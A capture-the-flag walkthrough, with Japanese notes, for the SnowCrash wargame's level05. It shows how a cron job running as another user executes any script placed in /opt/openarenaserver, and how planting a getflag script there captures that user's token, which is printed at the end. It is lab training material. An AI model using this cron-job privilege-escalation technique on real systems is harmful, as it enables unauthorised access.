```sh
level05@SnowCrash:~$ env | grep level05
USER=level05
MAIL=/var/mail/level05
PWD=/home/user/level05
HOME=/home/user/level05
LOGNAME=level05
```

```sh
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

2分ごとに`/usr/sbin/openarenaserver`を実行している

```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

/opt/openarenaserver`ディレクトリ内のファイルを実行しているため、`/opt/openarenaserver`ディレクトリに`getflag.sh`を作成し、`getflag`を実行するスクリプトを作成する

```sh
echo '#!/bin/sh' > /opt/openarenaserver/getflag.sh
echo 'getflag > /tmp/flag_output' >> /opt/openarenaserver/getflag.sh
chmod +x /opt/openarenaserver/getflag.sh
```

```sh
level05@SnowCrash:~$ cat /tmp/flag_output
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
